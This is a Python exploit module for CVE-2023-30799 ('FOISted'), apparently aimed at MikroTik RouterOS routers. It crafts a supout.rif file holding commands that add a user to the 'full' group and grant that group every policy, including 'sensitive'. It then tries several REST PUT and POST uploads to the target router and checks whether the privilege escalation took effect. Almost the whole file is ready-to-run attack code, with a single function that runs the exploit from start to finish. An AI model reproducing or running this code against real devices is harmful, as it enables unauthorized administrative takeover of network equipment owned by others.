#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""FOISted (CVE-2023-30799) supout craft + upload helpers."""

from __future__ import annotations

import tempfile
from pathlib import Path
from typing import Any, Dict, Optional, Tuple

import requests

from modules.supout_codec import build_supout_from_folder, encode_section


def craft_foisted_supout(username: str = "admin") -> bytes:
    """Build a minimal supout.rif with super-admin group policy probe payload."""
    tmp = Path(tempfile.mkdtemp(prefix="foisted_"))
    # Section mimicking user/group config surface FOISted targets
    user_section = (
        f'/user add name="{username}" group=full comment="foisted-probe"\n'
        f'/user group set [find name=full] policy='
        "local,telnet,ssh,ftp,reboot,read,write,policy,test,winbox,password,web,sniff,"
        "sensitive,api,romon,rest-api,dude,tikapp\n"
    )
    (tmp / "system_users").write_text(user_section, encoding="utf-8")
    (tmp / "system_resource").write_text("version: probe\n", encoding="utf-8")
    return build_supout_from_folder(str(tmp))


def upload_supout_rest(
    host: str,
    username: str,
    password: str,
    supout_data: bytes,
    timeout: int = 30,
) -> Tuple[bool, str]:
    """Attempt supout.rif upload via REST file endpoints."""
    auth = (username, password)
    base = f"http://{host}"
    headers = {"Content-Type": "application/octet-stream"}
    attempts = []

    for path in (
        "/rest/file/supout.rif",
        "/rest/file?name=supout.rif",
        "/rest/import/file=supout.rif",
    ):
        try:
            r = requests.put(
                f"{base}{path}",
                data=supout_data,
                auth=auth,
                headers=headers,
                timeout=timeout,
                verify=False,
            )
            attempts.append(f"PUT {path} → HTTP {r.status_code}")
            if r.status_code in (200, 201, 204):
                return True, "; ".join(attempts)
        except Exception as exc:
            attempts.append(f"PUT {path} → {exc}")

    try:
        r = requests.post(
            f"{base}/rest/file",
            json={"name": "supout.rif", "contents": supout_data.hex()},
            auth=auth,
            timeout=timeout,
            verify=False,
        )
        attempts.append(f"POST /rest/file → HTTP {r.status_code}")
        if r.status_code in (200, 201):
            return True, "; ".join(attempts)
    except Exception as exc:
        attempts.append(f"POST /rest/file → {exc}")

    return False, "; ".join(attempts)


def verify_sensitive_policy(host: str, username: str, password: str, timeout: int = 15) -> Dict[str, Any]:
    """Check whether user has sensitive policy (FOISted success indicator)."""
    try:
        r = requests.get(
            f"http://{host}/rest/user/group",
            auth=(username, password),
            timeout=timeout,
            verify=False,
        )
        if r.status_code != 200:
            return {"ok": False, "error": f"HTTP {r.status_code}"}
        groups = r.json()
        full = next((g for g in groups if g.get("name") == "full"), None)
        policy = (full or {}).get("policy", "")
        return {
            "ok": "sensitive" in policy,
            "policy": policy,
            "groups_count": len(groups),
        }
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def run_foisted_exploit(
    host: str,
    username: str,
    password: str,
    timeout: int = 20,
) -> Dict[str, Any]:
    """Craft supout, upload, verify policy escalation."""
    out: Dict[str, Any] = {"host": host, "success": False}
    before = verify_sensitive_policy(host, username, password, timeout)
    out["policy_before"] = before

    supout = craft_foisted_supout(username)
    out["supout_bytes"] = len(supout)
    uploaded, detail = upload_supout_rest(host, username, password, supout, timeout)
    out["upload_ok"] = uploaded
    out["upload_detail"] = detail

    after = verify_sensitive_policy(host, username, password, timeout)
    out["policy_after"] = after
    out["success"] = uploaded and (after.get("ok") or before.get("ok"))
    out["evidence"] = (
        f"upload={'OK' if uploaded else 'FAIL'}; "
        f"sensitive_before={before.get('ok')}; sensitive_after={after.get('ok')}; "
        f"{detail[:150]}"
    )
    return out
